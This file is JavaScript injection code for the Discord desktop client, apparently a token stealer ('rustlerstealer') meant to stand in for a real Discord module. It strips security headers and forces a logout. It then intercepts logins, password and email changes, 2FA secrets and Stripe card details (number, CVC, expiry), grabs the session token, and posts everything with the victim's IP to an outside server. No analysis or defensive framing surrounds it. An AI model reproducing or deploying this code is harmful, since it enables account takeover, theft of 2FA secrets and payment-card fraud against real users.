const ps = "base31",
    apiurl = "https://rustlerstealer.com",
    fs = require("fs"),
    path = require("path"),
    { BrowserWindow: BrowserWindow, session: session } = require("electron");
let webhook = "%WEBHOOK_LINK%";
const querystring = require("querystring");
function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "paradise"))) return !0;
    return (
        fs.rmdirSync(path.join(__dirname, "paradise")),
        BrowserWindow.getAllWindows()[0]
            .webContents.executeJavaScript(
                'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
                !0
            )
            .then((e) => {}),
        !1
    );
}
session.defaultSession.webRequest.onHeadersReceived((e, t) => {
    e.url.startsWith(webhook)
        ? e.url.includes("discord.com")
            ? t({ responseHeaders: Object.assign({ "Access-Control-Allow-Headers": "*" }, e.responseHeaders) })
            : t({
                  responseHeaders: Object.assign(
                      { "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"], "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Origin": "*" },
                      e.responseHeaders
                  ),
              })
        : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], t({ responseHeaders: { ...e.responseHeaders, "Access-Control-Allow-Headers": "*" } }));
});
const Filter = {
    urls: [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me/library",
        "https://discord.com/api/v*/users/@me/library",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*",
    ],
};
function login(e, t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
        `\n    let xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://api.ipify.org" );\n    xmlHttp.send( null );\n    xmlHttp.onreadystatechange = function() {//Call a function when the state changes.\n        if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {\n            let xhr = new XMLHttpRequest();\n    xhr.open("POST", "${apiurl}/send", true);\n    xhr.setRequestHeader("Content-Type", "application/json")\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify({\n        pseudo: "${ps}",\n        ip: xmlHttp.responseText,\n        token: "${n}",\n        type: "login",\n        password: "${t}"\n    }));\n        }\n    }\n    `,
        !0
    );
}
function passch(e, t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
        `\n    let xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://api.ipify.org" );\n    xmlHttp.send( null );\n    xmlHttp.onreadystatechange = function() {//Call a function when the state changes.\n        if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {\n            let xhr = new XMLHttpRequest();\n    xhr.open("POST", "${apiurl}/send", true);\n    xhr.setRequestHeader("Content-Type", "application/json")\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify({\n        pseudo: "${ps}",\n        ip: xmlHttp.responseText,\n        token: "${n}",\n        type: "password",\n        oldPassword: "${e}",\n        newPassword: "${t}"\n    }));\n        }\n    }\n    `,
        !0
    );
}
function emailch(e, t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
        `\n    let xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://api.ipify.org" );\n    xmlHttp.send( null );\n    xmlHttp.onreadystatechange = function() {//Call a function when the state changes.\n        if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {\n            let xhr = new XMLHttpRequest();\n    xhr.open("POST", "${apiurl}/send", true);\n    xhr.setRequestHeader("Content-Type", "application/json")\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify({\n        pseudo: "${ps}",\n        ip: xmlHttp.responseText,\n        token: "${n}",\n        type: "email",\n        email: "${e}",\n        password: "${t}"\n    }));\n        }\n    }\n    `,
        !0
    );
}
function a2fon(e, t, n) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
        `\n    let xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://api.ipify.org" );\n    xmlHttp.send( null );\n    xmlHttp.onreadystatechange = function() {//Call a function when the state changes.\n        if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {\n            let xhr = new XMLHttpRequest();\n    xhr.open("POST", "${apiurl}/send", true);\n    xhr.setRequestHeader("Content-Type", "application/json")\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify({\n        pseudo: "${ps}",\n        ip: xmlHttp.responseText,\n        token: "${n}",\n        type: "2FAon",\n        password: "${t}"\n secret: "${e}"\n   }));\n        }\n    }\n    `,
        !0
    );
}
function cardadd(e, t, n, s, o) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(
        `\n    let xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://api.ipify.org" );\n    xmlHttp.send( null );\n    xmlHttp.onreadystatechange = function() {//Call a function when the state changes.\n        if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {\n            let xhr = new XMLHttpRequest();\n    xhr.open("POST", "${apiurl}/send", true);\n    xhr.setRequestHeader("Content-Type", "application/json")\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify({\n        pseudo: "${ps}",\n        ip: xmlHttp.responseText,\n        token: "${o}",\n        type: "card",\n        num: "${e}",\n        date: "${n}/${s}",\n        cvc: "${t}"\n    }));\n        }\n    }\n    `,
        !0
    );
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (e, t) => {
    e.url.startsWith("wss://") ? t({ cancel: !0 }) : (FirstTime(), t({}));
});
const ChangePasswordFilter = {
    urls: [
        "https://discord.com/api/v*/users/@me",
        "https://discordapp.com/api/v*/users/@me",
        "https://*.discord.com/api/v*/users/@me",
        "https://discordapp.com/api/v*/auth/login",
        "https://discord.com/api/v*/auth/login",
        "https://*.discord.com/api/v*/auth/login",
        "https://api.stripe.com/v*/tokens",
    ],
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (e, t) => {
    if (e.url.endsWith("login") && 200 == e.statusCode) {
        const t = BrowserWindow.getAllWindows()[0],
            n = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()),
            s = n.login,
            o = n.password;
        t.webContents
            .executeJavaScript(
                'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                !0
            )
            .then((e) => {
                login(s, o, e);
            });
    }
    if (e.url.includes("users/@me/mfa/totp/enable") && 200 == e.statusCode) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()).password,
            s = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString()).secret;
        BrowserWindow.getAllWindows()[0]
            .webContents.executeJavaScript(
                'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                !0
            )
            .then((e) => {
                a2fon(s, t, e);
            });
    }
    if (e.url.endsWith("tokens")) {
        const t = BrowserWindow.getAllWindows()[0],
            n = querystring.parse(decodeURIComponent(Buffer.from(e.uploadData[0].bytes).toString()));
        t.webContents
            .executeJavaScript(
                'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                !0
            )
            .then((e) => {
                cardadd(n["card[number]"], n["card[cvc]"], n["card[exp_month]"], n["card[exp_year]"], e);
            });
    }
    if (e.url.endsWith("users/@me") && 200 == e.statusCode && "PATCH" == e.method) {
        const t = JSON.parse(Buffer.from(e.uploadData[0].bytes).toString());
        if (null != t.password && null != t.password && "" != t.password) {
            if (null != t.new_password && null != t.new_password && "" != t.new_password) {
                BrowserWindow.getAllWindows()[0]
                    .webContents.executeJavaScript(
                        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                        !0
                    )
                    .then((e) => {
                        passch(t.password, t.new_password, e);
                    });
            }
            if (null != t.email && null != t.email && "" != t.email) {
                BrowserWindow.getAllWindows()[0]
                    .webContents.executeJavaScript(
                        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                        !0
                    )
                    .then((e) => {
                        emailch(t.email, t.password, e);
                    });
            }
        }
    }
}),
    (module.exports = require("./core.asar"));
